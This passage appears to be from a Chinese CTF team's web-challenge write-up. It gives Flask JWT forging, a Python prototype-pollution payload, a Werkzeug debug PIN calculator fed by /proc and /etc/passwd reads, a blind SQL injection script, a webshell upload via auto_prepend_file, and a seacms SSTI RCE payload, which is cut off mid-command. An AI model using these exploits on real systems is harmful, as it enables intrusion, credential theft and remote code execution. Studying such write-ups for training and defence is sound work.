class="string">&#x27;token&#x27;</span>, token)</span><br><span class="line">                <span class="keyword">return</span> response</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> jsonify(response0), <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">    <span class="keyword">return</span> jsonify(response2), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    response = jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Logout successful!&#x27;</span>&#125;)</span><br><span class="line">    response.delete_cookie(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/search&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@auth</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;file&#x27;</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(request.args.get(<span class="string">&#x27;file&#x27;</span>), <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                data = file.read()</span><br><span class="line">            <span class="keyword">return</span> render_template_string(data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;File not found&#x27;</span>, <span class="number">404</span></span><br><span class="line">        <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;something error?&#x27;</span>, <span class="number">500</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(response2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MemUser</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setUser</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = password</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setToken</span>(<span class="params">self, token</span>):</span><br><span class="line">        self.token = token</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">        self.password = <span class="string">&quot;password&quot;</span></span><br><span class="line">        self.token = jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>: self.username, <span class="string">&#x27;password&#x27;</span>: self.password&#125;, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    User = MemUser()</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å®¡è®¡æºç ä¼šå‘ç°å…¶å­˜åœ¨åº”è¯¥å‡½æ•°ä¸ºgetflagï¼Œéœ€è¦ä½¿ç”¨/enterIdealStateè·¯ç”±æ‰å¯ä»¥ï¼Œå½“è®¿é—®è¿™ä¸ªè·¯ç”±æ˜¯ä¼šæé†’ï¼Œä½ ä¸æ˜¯Platoï¼Œè€Œä¸”æˆ‘ä»¬ä¹Ÿæ— æ³•æ³¨å†Œè¿™ä¸ªè´¦å·ã€‚è¿™æ—¶å€™æˆ‘ä»¬éœ€è¦ä½¿ç”¨flaskçš„sessionä¼ªé€ äº†ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶sessionçš„keyä¸ºç¯å¢ƒå˜é‡é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥ä½¿ç”¨/proc/self/environæ¥è¿›è¡ŒæŸ¥çœ‹ç¯å¢ƒå˜é‡ã€‚åœ¨ç¯å¢ƒå˜é‡é‡Œæ‰¾åˆ°keyæˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œä¼ªé€ äº†ã€‚ä¸‹é¢æ˜¯è„šæœ¬<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">username = <span class="string">&quot;Plato&quot;</span></span><br><span class="line">password = <span class="string">&quot;ideal_state&quot;</span></span><br><span class="line">secret_key = <span class="string">&quot;B3@uTy_L1es_IN_7he_EyEs_0f_Th3_BEh0ld3r&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;password&#x27;</span>: password&#125;</span><br><span class="line">token = jwt.encode(payload, secret_key, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Generated token:&quot;</span>, token)</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>å°†ä¼ªé€ çš„tokenæ”¾åœ¨cookieé‡Œå°±å¯ä»¥æŸ¥çœ‹/enterIdealStateè·¯ç”±å¾—åˆ°flagäº†</p><h2 id="Po11uti0n"><a href="#Po11uti0n" class="headerlink" title="Po11uti0n~~~"></a>Po11uti0n~~~</h2><p>è§£é¢˜äººï¼šLSE<br>æˆ‘ä»¬æ‰“å¼€é¶æœºå¯ä»¥çœ‹åˆ°å¾ˆæ˜æ˜¾çš„äº¤æ¢å‡½æ•°ã€‚çœ‹åˆ°è¿™ä¸ªäº¤æ¢å‡½æ•°æˆ‘å°±æƒ³èµ·äº†jsåŸå‹é“¾æ±¡æŸ“ã€‚æ‰€æœ‰æˆ‘æŸ¥äº†ä¸€ä¸‹pythonåŸå‹é“¾æ±¡æŸ“å‘ç°å¥½å¤šæ–‡ç« ã€‚<a href="https://xz.aliyun.com/t/13072?time__1311=mqmxnDBDuDcAiQ3DsD7mN0%3Dn2DMY3YqQ4D&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F">pythonåŸå‹é“¾æ±¡æŸ“</a>æˆ‘ä»¬å¯ä»¥å‘ç°è¿™ç¯‡æ–‡ç« çš„é¢˜ç›®å’Œè¿™é“é¢˜ç›®ä¸èƒ½è¯´å¾ˆåƒåªèƒ½è¯´ä¸€æ¨¡ä¸€æ ·ã€‚åªæ˜¯è¿™é“éœ€è¦é¢˜ç›®å¤šè¿‡æ»¤ä¸ª<strong>file</strong>ç”±äºæ—¶é—´é—®é¢˜å¿«åˆ°äº¤wpçš„æ—¶é—´äº†æ‰€æœ‰æˆ‘å°±å†™çš„ç®€ç•¥äº›ã€‚<br>ç›´æ¥è´´å‡ºPOC<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="number">2</span><span class="punctuation">,</span><span class="attr">&quot;\u005F\u005F\u0069\u006E\u0069\u0074\u005F\u005F&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span>      <span class="attr">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;\u005f\u005f\u0066\u0069\u006c\u0065\u005f\u005f&quot;</span><span class="punctuation">:</span>   <span class="string">&quot;/etc/machine-id&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;ykg6xtt2j2l&quot;</span><span class="punctuation">:</span><span class="string">&quot;=&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><br>å› ä¸ºæœ‰wafæ‰€ä»¥éƒ½ä½¿ç”¨unicodeç¼–ç ç»•è¿‡ã€‚è¿™æ ·æˆ‘ä»¬åªè¦ä¿®æ”¹<strong>file</strong>çš„å‚æ•°å°±å¯ä»¥è¯»å–æ–‡ä»¶å†…å®¹äº†ã€‚<br>è€Œè¿™é“é¢˜ç›®å¼€å¯äº†debugè¿™å°±å¯¼è‡´äº†æˆ‘ä»¬å¯ä»¥æ—¢ç„¶debugçš„åå°è¾“å…¥pinç å°±å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">etc/passwdè¯»å–</span><br><span class="line">root</span><br><span class="line"></span><br><span class="line">/proc/self/cmdline è¯»å–</span><br><span class="line">/usr/local/lib/python3.10/site-packages/flask/app.py</span><br><span class="line"></span><br><span class="line">/sys/class/net/eth0/address </span><br><span class="line">02:42:ac:02:da:ab è¦è½¬æˆåè¿›åˆ¶ </span><br><span class="line">/proc/self/cgroup</span><br><span class="line">1:name=systemd:/docker/e3690bcd5632d5f662f8ad2ce089634f784ee0d79d067fbca449b596e8120a9c</span><br><span class="line"></span><br><span class="line">/proc/sys/kernel/random/boot_id</span><br><span class="line">780aeba6-919e-4c3d-854f-e2e8936f5ab1e3690bcd5632d5f662f8ad2ce089634f784ee0d79d067fbca449b596e8120a9c </span><br></pre></td></tr></table></figure><br>è¿˜å¥½è¿™é¢˜æœ‰åšè®°å½•ä¸ç„¶äº›çš„ä¼šçƒ¦æ­»ã€‚<br>è®¡ç®—è„šæœ¬<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span>  <span class="comment"># username å¯é€šè¿‡/etc/passwdè·å–</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># modnameé»˜è®¤å€¼</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># é»˜è®¤å€¼ getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.10/site-packages/flask/app.py&#x27;</span>  <span class="comment"># è·¯å¾„ å¯æŠ¥é”™å¾—åˆ°  getattr(mod, &#x27;__file__&#x27;, None)</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485376965341&#x27;</span>,  <span class="comment"># /sys/class/net/eth0/address macåœ°å€åè¿›åˆ¶</span></span><br><span class="line">    <span class="string">&#x27;780aeba6-919e-4c3d-854f-e2e8936f5ab1b815cf6e0ea5a8d5f48354e1c70efac306a5c97591745d4be1e29d9f07c60acd&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># å­—ç¬¦ä¸²åˆå¹¶ï¼š1./etc/machine-id(dockerä¸ç”¨çœ‹) /proc/sys/kernel/random/boot_idï¼Œæœ‰boot-idé‚£å°±æ‹¼æ¥boot-id 2. /proc/self/cgroup</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸‹é¢ä¸ºæºç é‡Œé¢æŠ„çš„ï¼Œä¸éœ€è¦ä¿®æ”¹</span></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure></p><h2 id="ä»sqlåˆ°rceç­¾åˆ°"><a href="#ä»sqlåˆ°rceç­¾åˆ°" class="headerlink" title="ä»sqlåˆ°rceç­¾åˆ°"></a>ä»sqlåˆ°rceç­¾åˆ°</h2><p>è§£é¢˜äººï¼šLSE<br>æ‰“å¼€é¶æœºæˆ‘ä»¬å…ˆç”¨dirseachæ‰«ä¸€ä¸‹åå°æˆ‘ä»¬ä¼šå‘ç°adminè¿™ä¸ªè·¯ç”±<br>æˆ‘ä»¬ç‚¹å¡adminè·¯ç”±ä¼šå‘ç°æ˜¯ä¸ªç™»é™†é¡µé¢ã€‚æˆ‘ä»¬å°è¯•å‡ ä¸ªå¼±å¯†ç ä¼šå‘ç°ä¸ºtest/test<br>ç™»é™†è¿›å»ä¸ºä¸€ä¸ªåå°é¡µé¢ï¼Œæˆ‘ä»¬åœ¨ç½‘ä¸Šæœç´¢CMSçš„sqlæ³¨å…¥çš„å‘ç°è¿™ä¸€ç¯‡æ–‡ç« <a href="https://blog.csdn.net/solitudi/article/details/117465020?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22117465020%22%2C%22source%22%3A%22qq_14997543%22%7D&amp;fromshare=blogdetail">S_cmsçš„sqlæ³¨å…¥</a><br>çœ‹æ¥æ–‡ç« å‘ç°å…¶æˆå› ä¸ºä½œè€…å¿˜è®°å¯¹æ•°ç»„çš„è¾“å…¥å½¢å¼è¿›è¡Œè¿‡æ»¤å¯¼è‡´äº†sqlæ³¨å…¥æ¼æ´ã€‚<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/sql-1.png" class="" title="alt text"><br>è·Ÿç€æ–‡ç« æˆ‘ä»¬èƒ½æ‰¾åˆ°ä¸‹é¢è¿™å¥sqlè¯­å¥<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">splitx</span>(<span class="variable">$x</span>, <span class="string">&quot;_&quot;</span>, <span class="number">0</span>) == <span class="string">&quot;hide&quot;</span>) &#123;</span><br><span class="line">                    <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="string">&quot;update &quot;</span> . TABLE . <span class="string">&quot;menu set U_hide=&quot;</span> . <span class="variable">$_POST</span>[<span class="variable">$x</span>][<span class="number">0</span>] . <span class="string">&quot; where U_id=&quot;</span> . <span class="title function_ invoke__">splitx</span>(<span class="variable">$x</span>, <span class="string">&quot;_&quot;</span>, <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure><br>å¯ä»¥å‘ç°å…¶æ³¨å…¥ç‚¹ä½ä¸º<code>POST[$X][]</code>$xæˆ‘ä»¬å¯ä»¥æ ¹æ®è¿™å¥<code>if (splitx($x, &quot;_&quot;, 0) == &quot;hide&quot;)</code>å‘ç°ä¸ºhide_xxxxæ ¹æ®å˜é‡åæˆ‘ä»¬åŸºæœ¬å¯ä»¥é”å®šä¸ºä¸¤ä¸ªéšè—æŒ‰é’®ï¼Œæˆ‘ä»¬ä¸€ä¸ªä¸€ä¸ªè¿›è¡Œå°è¯•<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/sql-2.png" class="" title="alt text"><br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/sql-3.png" class="" title="alt text"><br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/sql-4.png" class="" title="alt text"><br>å°è¯•åä¼šå‘ç°æ³¨å…¥ç‚¹ä½äºèœå•åˆ—è¡¨çš„éšè—æŒ‰é’®ä¸­ã€‚ç®€å•å°è¯•ä¸€ä¸‹å‘ç°åªèƒ½ç»§ç»­æ—¶é—´ç›²æ³¨ã€‚æˆ‘ä»¬ç›´æ¥ä½¿ç”¨ç›²æ³¨è„šæœ¬è¿›è¡Œæ³¨å…¥ï¼Œç”±äºæ²¡æœ‰è¿‡æ»¤æ‰¾åˆ°æ³¨å…¥ç‚¹å°±å¯ä»¥è½»æ¾çš„æ³¨å‡ºæ•°æ®åº“çš„å†…å®¹äº†<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">cookies=&#123;<span class="string">&quot;authx&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;userx&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;passx&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;count_all&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;user&quot;</span>:<span class="string">&quot;test&quot;</span>,<span class="string">&quot;pass&quot;</span>:<span class="string">&quot;d79883b3b84f946ade345c8b8e4c6f75&quot;</span>,<span class="string">&quot;A_type&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;auth&quot;</span>:<span class="string">&quot;0%7C0%7C0%7C0%7C0%7C0%7C0%7C1%7C0%7C0%7C0%7C0%7C0&quot;</span>,<span class="string">&quot;__51vcke__JdquY3gNURaKiAFU&quot;</span>:<span class="string">&quot;d944ee39-93c6-5039-8275-52e76e2ef701&quot;</span>,<span class="string">&quot;__51vuft__JdquY3gNURaKiAFU&quot;</span>:<span class="string">&quot;1709351593670&quot;</span>,<span class="string">&quot;CmsCode&quot;</span>:<span class="string">&quot;ajov&quot;</span>,<span class="string">&quot;PHPSESSID&quot;</span>:<span class="string">&quot;a51d92610a0bb5c1a201d76e96d9904b&quot;</span>,<span class="string">&quot;__vtins__JdquY3gNURaKiAFU&quot;</span>:<span class="string">&quot;%7B%22sid%22%3A%20%22844d5f30-dc94-5dc2-b18c-702fa7ab3c38%22%2C%20%22vd%22%3A%201%2C%20%22stt%22%3A%200%2C%20%22dr%22%3A%200%2C%20%22expires%22%3A%201709438139545%2C%20%22ct%22%3A%201709436339545%7D&quot;</span>,<span class="string">&quot;__51uvsct__JdquY3gNURaKiAFU&quot;</span>:<span class="string">&quot;8&quot;</span>&#125;</span><br><span class="line">url = <span class="string">&quot;http://node5.anna.nssctf.cn:28149/admin/ajax.php?action=save&amp;type=menu&amp;lang=0&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;hide_41[]&quot;</span>:<span class="string">&quot;&quot;</span>&#125;<span class="comment">#è¿™ä¸ªå˜é‡æ˜¯urlè§£ç åçš„ã€‚ä¸è§£ç ä¹Ÿå¯ä»¥</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">150</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low + high) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        payload[<span class="string">&quot;hide_41[]&quot;</span>] = <span class="string">&quot;1 and if(ascii(substr((select group_concat(A_login) from SL_admin),%d,1))&gt;%d,sleep(4),0)&quot;</span> % (i, mid)</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        r = requests.post(url, data=payload,cookies=cookies)</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        <span class="keyword">if</span> end_time - start_time &gt; <span class="number">3</span>:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> (mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><br>åªè¦ä¿®æ”¹ä¸€ä¸‹æ³¨å…¥è¯­å¥å°±å¯ä»¥ä¸€é”®æ³¨å…¥äº†<br><strong>æ³¨æ„ç”±äºè¿™é¢˜æ˜¯åœ¨åå°æ³¨å…¥çš„ï¼Œä½¿ç”¨æˆ‘ä»¬æ³¨å…¥æ˜¯éœ€è¦å¸¦ä¸Šcookieï¼Œä¸ç„¶æ— æ³•ç™»é™†è‡ªç„¶ä¹Ÿæ— æ³•æ³¨å…¥äº†</strong><br>å½“æˆ‘ä»¬æ³¨å…¥å‡ºè´¦å·å¯†ç ç›´æ¥ç™»é™†åˆ°åå°<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/sql-5.png" class="" title="alt text"><br>ä¼šå‘ç°æˆ‘ä»¬å¯ä»¥ä¿®æ”¹ä¸Šä¼ çš„æ–‡ä»¶åç¼€ï¼Œè™½ç„¶æ— æ³•ä¸Šä¼ phpæ–‡ä»¶ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä¸Šä¼ iniæ–‡ä»¶ä¸Šä¼ çš„iniæ–‡ä»¶å†…å®¹ä¸º<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=muma.jpg</span><br></pre></td></tr></table></figure><br>åœ¨å°†ä¸€å¥è¯æœ¨é©¬æ”¹æˆmuma.jpgæ–‡ä»¶å°±å¯ä»¥ä¸Šä¼ æˆåŠŸäº†ã€‚ä¹‹åä½¿ç”¨èšå‰‘ç»ƒæ¥index.phpå°±å¯ä»¥äº†<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/sql-6.png" class="" title="alt text"></p><h2 id="sstié€åˆ†"><a href="#sstié€åˆ†" class="headerlink" title="sstié€åˆ†"></a>sstié€åˆ†</h2><p>è§£é¢˜äººï¼šLSE<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/ssti-1.png" class="" title="alt text"><br>æˆ‘ä»¬æ‰“å¼€é¶æœºå‘ç°å«æµ·æ´‹å½±è§†é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°è¯•æœç´¢æµ·æ´‹cmsçš„sstiæ³¨å…¥ï¼Œä¼šå‘ç°å¥½çš„å…³äºè¿™ä¸ªæ³¨å…¥çš„æ–‡ç« ï¼Œæˆ‘è¿™é‡Œç›´æ¥è´´ä¸€ç¯‡æˆ‘ç»™ä¸ªäººè®¤ä¸ºè®²çš„æ¯”è¾ƒè¯¦ç»†çš„æ–‡ç« ï¼Œ<a href="https://blog.csdn.net/qq_41918771/article/details/103770943">seacmsçš„ssti</a><br>æˆ‘ä»¬çœ‹æ–‡ç« ä¼šå‘ç°è¿™ä¸ªæ¼æ´çš„ä¸»è¦éƒ¨åˆ†æ˜¯æ¨¡æ¿çš„åµŒå¥—å¯¼è‡´çš„è¯­å¥æ‹¼æ¥ï¼Œå¯¼è‡´å…¶é€ æˆRCEï¼Œç”±äºæ”¹äº†æºç æˆ‘ä»¬æ— æ³•ç›´æ¥ä½¿ç”¨ç½‘ä¸Šçš„poc<br>ä¸‹é¢æ˜¯ä¿®æ”¹çš„éƒ¨åˆ†<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/ssti-2.png" class="" title="alt text"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶å˜é‡é¡ºåºä¸ç½‘ä¸Šçš„ä¸åŒä½¿ç”¨æˆ‘ä»¬ä¿®æ”¹pocçš„ç¬¬ä¸€éƒ¨åˆ†å°±æ˜¯è®²æ¨¡æ¿å˜é‡åµŒå¥—çš„é¡ºåºè¿›è¡Œä¿®æ”¹ã€‚<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/ssti-3.png" class="" title="alt text"><br>ä¸Šé¢çš„è¯­å¥å¯¼è‡´äº†å…¶åªä¼šæå–å‰20ä¸ªå­—ç¬¦æ‰€æœ‰æˆ‘ä»¬ä¸ä»…è¦ä¿®æ”¹å˜é‡åµŒå¥—çš„é¡ºåºè¿˜è¦ä¿®æ”¹æ‹¼æ¥çš„è¯­å¥<br>æˆ‘å°±ç›´æ¥ä¸¢å‡ºpocè¿›è¡Œè®²è§£å§<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/4.png" class="" title="alt text"><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchtype=<span class="number">5</span>&amp;searchword=&#123;<span class="keyword">if</span>&#123;searchpage:area&#125;&amp;area=:e&#123;searchpage:lang&#125;&#125;&amp;yuyan=<span class="title function_ invoke__">val</span>(&#123;<span class="attr">searchpage</span>:ver&#125;&amp;ver=j&#123;<span class="attr">searchpage</span>:letter&#125;&amp;letter=oin&#123;<span class="attr">searchpage</span>:jq&#125;&amp;jq=(<span class="variable">$_</span>&#123;<span class="attr">searchpage</span>:year&#125;&amp;year=POST[<span class="number">9</span>]))&amp;<span class="number">9</span>[]=sys&amp;<span class="number">9</span>[]=<span class="title function_ invoke__">tem</span>(<span class="string">&#x27;tac 